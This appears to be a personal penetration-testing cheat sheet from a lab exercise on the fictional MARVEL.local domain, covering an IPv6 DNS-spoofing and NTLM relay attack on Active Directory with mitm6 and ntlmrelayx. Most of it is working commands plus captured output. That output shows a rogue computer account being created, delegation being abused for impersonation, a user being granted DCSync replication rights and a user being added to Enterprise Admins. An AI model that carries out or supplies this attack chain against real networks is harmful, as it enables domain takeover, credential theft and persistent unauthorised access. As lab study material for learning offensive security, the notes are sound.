mitim6 (search for dirk jan m)

# mitm6:
```
mitm6 -d (domain to attack like marvel.local)
then use:
python3 ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakepad.marvel.local -l lootme
```



## IPv6: mitm6
1. install from github
```
cd /opt; git clone https://github.com/fox-it/mitm6.git; cd mitm6
```
2. get Domain Controller IP 
Domain controllers will show port 389 running the Microsoft Windows AD LDAP service:
```
nmap -p389 -sV <IP-range>           # faster but may not return results if the server is blocking pings
nmap -p389 -sV -Pn <IP-range>       # slower but more accurate
```
Expected Output:
```
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: MARVEL.local0., Site: Default-First-Site-Name)
MAC Address: CC:2F:71:3A:CE:3D (Intel Corporate)
Service Info: Host: HYDRA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
OR:
```
nmap -p 389 -T4 -A -v --script ldap-rootdse <IP-range>
```
3. get Domain name using nmap
```
nmap --script smb-enum-domains.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 <host>
```
OR:
```
nmap --script smb-os-discovery.nse -p445 127.0.0.1
sudo nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 127.0.0.1
```

4. run mitm6
```
sudo python mitm6.py -d <domain>.local
```

5. run ntmlrelayx.py at the same time
Download from: https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py
```
python3 ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
```
6. check on results:
all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
```
firefox ./lootme/domain_users.html
```
Always check for passwords in the description. 



## Example: 
```
sudo mitm6 -d marvel.local 
python3 /opt/impacket/examples/ntlmrelayx.py  -6 -t ldaps://192.168.1.40 -wh attacker-wpad --delegate-access -l lootme
```
Output:
```
python3 /opt/impacket/examples/ntlmrelayx.py  -6 -t ldaps://192.168.1.40 -wh attacker-wpad --delegate-access -l lootme
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from ::ffff:192.168.1.43, attacking target ldaps://192.168.1.40
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Serving PAC file to client ::ffff:192.168.1.43
[*] HTTPD: Received connection from ::ffff:192.168.1.42, attacking target ldaps://192.168.1.40
[*] HTTPD: Client requested path: api.msn.com:443
[*] HTTPD: Received connection from ::ffff:192.168.1.42, attacking target ldaps://192.168.1.40
[*] HTTPD: Client requested path: api.msn.com:443
[*] HTTPD: Received connection from ::ffff:192.168.1.42, attacking target ldaps://192.168.1.40
[*] HTTPD: Client requested path: api.msn.com:443
[-] Exception in HTTP request handler: 'NoneType' object has no attribute 'sendAuth'
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Serving PAC file to client ::ffff:192.168.1.43
[*] HTTPD: Received connection from ::ffff:192.168.1.43, attacking target ldaps://192.168.1.40
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Received connection from ::ffff:192.168.1.43, attacking target ldaps://192.168.1.40
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Client requested path: login.live.com:443
[*] Authenticating against ldaps://192.168.1.40 as MARVEL\SPIDERMAN$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.1.43, attacking target ldaps://192.168.1.40
[*] HTTPD: Client requested path: v10.events.data.microsoft.com:443
[*] Attempting to create computer in: CN=Computers,DC=MARVEL,DC=local
[*] Adding new computer with username: VEBAGGDB$ and password: lb1##rB-xtdgo/e result: OK
[*] Delegation rights modified succesfully!
[*] VEBAGGDB$ can now impersonate users on SPIDERMAN$ via S4U2Proxy
```

Note the last few lines: 
1. created new computer with username: VEBAGGDB$ and password: lb1##rB-xtdgo/e 
2. VEBAGGDB$ can now impersonate users on SPIDERMAN$ via S4U2Proxy


## Output 2:
```
[*] Authenticating against ldaps://192.168.1.40 as MARVEL\SPIDERMAN$ SUCCEED
[*] Adding new computer with username: PRIIXMBG$ and password: .<RkvFZ|RDWX"+b result: OK
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Delegation rights modified succesfully!
[*] PRIIXMBG$ can now impersonate users on PUNISHER$ via S4U2Proxy
[*] Adding new user with username: IpqcRphqvs and password: VTzUXe=Fr4nsIGu result: OK
[*] Querying domain security descriptor
[*] Delegation rights modified succesfully!
[*] PRIIXMBG$ can now impersonate users on SPIDERMAN$ via S4U2Proxy
[*] Success! User IpqcRphqvs now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20210714-120340.restore
[*] Adding user: PRIIXMBG to group Enterprise Admins result: OK
[*] Privilege escalation succesful, shutting down...
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
...
[*] Authenticating against ldaps://192.168.1.40 as MARVEL\SPIDERMAN$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
...
[*] Authenticating against ldaps://192.168.1.40 as MARVEL\tstark SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00\x9ft#\xa5\xbd\x84\x00S\x16\xaf\xab\x96\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00\x9ft#\xa5\xbd\x84\x00S\x16\xaf\xab\x96\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00\x9ft#\xa5\xbd\x84\x00S\x16\xaf\xab\x96\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00\x9ft#\xa5\xbd\x84\x00S\x16\xaf\xab\x96\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00\x9ft#\xa5\xbd\x84\x00S\x16\xaf\xab\x96\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
```

Note: was able to create a user and a computer on the network. which now show up in the DC. 
